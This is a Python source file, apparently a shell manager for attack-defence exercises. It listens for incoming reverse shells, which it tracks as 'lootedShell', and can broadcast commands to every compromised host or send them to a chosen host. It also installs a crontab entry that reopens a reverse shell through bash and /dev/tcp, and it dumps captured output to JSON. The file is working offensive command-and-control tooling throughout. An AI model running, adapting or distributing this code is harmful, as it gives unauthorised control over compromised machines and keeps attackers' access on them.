import json
import random
import socket
import threading
import time
import traceback

lootedShell = {}

LPORT = 7777
MAX_CONN_PER_HOST = 3
SPECIAL_STRING_FRONT = "#RANDOM#->"
SPECIAL_STRING_BEHIND = "<-#RANDOM#"
CRONTAB = [
    "* * * * * bash -i >& /dev/tcp/127.0.0.1/1234 0>&1",
]
TIME_WAIT_VERIFY = 3

def listen(sck, lport):
    sck.bind(("0.0.0.0", lport))
    sck.listen()
    while True:
        subsck, addr = sck.accept()
        host = addr[0]
        port = addr[1]
        if not host in lootedShell:
            lootedShell[host] = {}
        if len(lootedShell[host]) < MAX_CONN_PER_HOST:
            if port in lootedShell[host]: # 可能出于某些神奇原因原来的连接还在的话...
                try:
                    lootedShell[host][port]["sck"].close()
                except Exception:
                    pass
            lootedShell[host][port] = {"died": False, "sck": subsck, "addr": addr, "time": time.time(), "history": bytearray()}
            threading.Thread(target=recv, args=(subsck, addr), daemon=True).start()      
        else:
            try:
                subsck.close()
            except Exception:
                pass


def recv(sck, addr):
    host = addr[0]
    port = addr[1]
    try:
        while True:
            lootedShell[host][port]["history"].extend(sck.recv(1024))
            lootedShell[host][port]["time"] = time.time()
    except Exception:
        if host in lootedShell and port in lootedShell[host]:
            lootedShell[host][port]["died"] = True


def send(cmd):
    print(f"[*] Using {cmd}")
    cmd += "\n"
    count = 0
    for host in lootedShell:
        for port in lootedShell[host]:
            if not lootedShell[host][port]["died"]:
                try:
                    lootedShell[host][port]["sck"].send(cmd.encode())
                    count += 1
                except Exception:
                    lootedShell[host][port]["died"] = True
    print(f"[*] Has been sended to {count} shells")


def sendwe(cmd):
    # 可以用 f"{SPECIAL_STRING_FRONT}([\S\s]*?){SPECIAL_STRING_BEHIND}" 来快速捕捉输出
    tmp = f"{SPECIAL_STRING_FRONT[0]}\"\"{SPECIAL_STRING_FRONT[1:]}" # 在中间加一个 "", 使得反射回来的命令不会被捕捉到
    cmd = f"echo -n \"{tmp}\";{cmd};echo -n \"{SPECIAL_STRING_BEHIND}\";"
    print(f"[*] Using {cmd}")
    cmd += "\n"
    count = 0
    for host in lootedShell:
        for port in lootedShell[host]:
            if not lootedShell[host][port]["died"]:
                try:
                    lootedShell[host][port]["sck"].send(cmd.encode())
                    count += 1
                except Exception:
                    lootedShell[host][port]["died"] = True
    print(f"[*] Has been sended to {count} shells")


def sendsp(mixed):
    mixed = mixed.lstrip()
    if mixed.find(' ') == -1:
        print("[-] Please input right format using `sendsp [host] [cmd]`")
        return
    pos = mixed.find(' ')
    host = mixed[:pos]
    cmd = mixed[pos:]
    if not host in lootedShell:
        print(f"[-] Host {host} not found")
        return
    print(f"[*] Sending {cmd} to {host}")
    cmd += "\n"
    tmp = random.choice(list(lootedShell[host]))
    lootedShell[host][tmp]["sck"].send(cmd.encode())


def cron(placeholder):
    # 尝试用 crontab 持久化, 可以再开一个专门的端口来接
    cmdFinal = "echo -e \""
    for cmd in CRONTAB:
        cmdFinal += cmd
        cmdFinal += "\\n"
    cmdFinal += "\" > /tmp/sess_87ja0rn7tkutlo61k091du52l7;crontab /tmp/sess_87ja0rn7tkutlo61k091du52l7;rm /tmp/sess_87ja0rn7tkutlo61k091du52l7;"
    send(cmdFinal)


def info(placeholder):
    count = 0
    aliveCount = 0
    for host in lootedShell:
        for port in lootedShell[host]:
            count += 1
            if lootedShell[host][port]["died"]:
                pass
            else:
                aliveCount += 1
                print(f"[*] {lootedShell[host][port]['addr']}")
    print(f"[*] {count} shells in total, {aliveCount} alive, {len(lootedShell)} hosts")


def dump(filename):
    result = []
    for host in lootedShell:
        for port in lootedShell[host]:
            tmp = lootedShell[host][port]
            history = tmp["history"].decode('latin') # 只支持英文, 但是这样 json dump 起来方便
            result.append({"died": tmp["died"], "addr": tmp["addr"], "time": tmp["time"], "history": history})

    if len(filename) == 0:
        filename = f"dump-{time.time()}.json"
        print(f"[*] No filename specified, dumped to {filename}")
    else:
        print(f"[*] Dumped to {filename}")
    f = open(filename, "w")
    f.write(json.dumps(result))
    f.close()
    print("[*] Dump complete")
        

def flush(filename):
    dump(filename)
    diedShell = 0
    for host in list(lootedShell):
        for port in list(lootedShell[host]):
            if lootedShell[host][port]["died"]:
                lootedShell[host].pop(port)
                diedShell += 1
                if len(lootedShell[host]) == 0:
                    lootedShell.pop(host)
            else:
                lootedShell[host][port]["history"] = bytearray()
    print(f"[*] Flush success, {diedShell} died shells were swept")


def verify(placeholder):
    verifyStr = "###"
    for _ in range(10):   
        verifyStr += str(random.randint(0, 9999))
        verifyStr += "###"
    tmp = "echo \"" + verifyStr[0] + "\"\"" + verifyStr[1:] + "\""
    send(tmp)
    print(f"[*] Wait {TIME_WAIT_VERIFY} second for verify...")
    time.sleep(TIME_WAIT_VERIFY)
    print(f"[*] Now staring verify")
    for host in lootedShell:
        for port in lootedShell[host]:
            if lootedShell[host][port]["history"].rfind(verifyStr.encode()) == -1:
                lootedShell[host][port]["died"] = True
    flush("")


def help(placeholder):
    print("[*] Help:")
    print("[1] exec [cmd]")
    print("    Command after exec will be send to all shells")
    print("[2] execwe [cmd]")
    print("    Exec with echo, friendly with regex")
    print("[3] execsp [host] [cmd]")
    print("    Exec with special host")
    print("[4] cron")
    print("    Try to persistence with crontab")
    print("[5] info")
    print("    Get curr shell infos")
    print("[6] dump (filename)")
    print("    Dump all result to file")
    print("[7] flush (filename)")
    print("    Dump all result and flush died shells and history")
    print("[8] verify")
    print("    Verify shells with echo")


def main(lport):
    sck = socket.socket()
    threading.Thread(target=listen, args=(sck, lport), daemon=True).start()
    mapping = {
        "exec": send,
        "execwe": sendwe,
        "execsp": sendsp,
        "cron": cron,
        "info": info,
        "dump": dump,
        "flush": flush,
        "verify": verify,
        "help": help,
        "?": help
    }
    while True:
        try:
            i = input(">>> ").strip()
            choice = i.split(" ")[0]
            if choice in mapping:
                try:
                    mapping[choice](i[len(choice) + 1:])  # 将命令后面的传给函数作为参数
                except Exception:
                    traceback.print_exc()
            else:
                if len(i) != 0:
                    print("[-] Invalid command, use 'help' to get more information")
        except (KeyboardInterrupt, EOFError):
            while True:
                try:
                    i = input("\nPress 'Y' to confirm: ")
                except (KeyboardInterrupt, EOFError):
                    continue
                if i.strip().lower() == "y":
                    try:
                        sck.close()
                    except Exception:
                        pass
                    return
                else:
                    break

main(LPORT)
